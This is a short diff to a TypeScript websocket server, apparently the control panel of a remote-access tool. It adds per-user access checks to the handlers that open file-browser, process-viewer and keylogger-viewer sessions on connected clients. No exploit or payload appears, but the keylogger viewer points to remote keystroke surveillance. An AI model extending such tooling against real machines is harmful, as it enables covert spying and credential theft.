@@ -9,6 +9,7 @@ import { encodeMessage } from "../protocol";
 import * as sessionManager from "../sessions/sessionManager";
 import type { SocketData } from "../sessions/types";
 import { normalizeFileUploadPayload } from "../fileTransfers";
+import { canUserAccessClient } from "../users";
 
 type FileBrowserViewer = {
   id: string;
@@ -61,7 +62,11 @@ function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
 }
 
 export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
@@ -280,7 +285,11 @@ export function handleFileBrowserMessage(clientId: string, payload: any, deps: W
 }
 
 export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
@@ -330,7 +339,11 @@ export function handleProcessMessage(clientId: string, payload: any) {
 }
 
 export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   const target = clientManager.getClient(clientId);
   const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
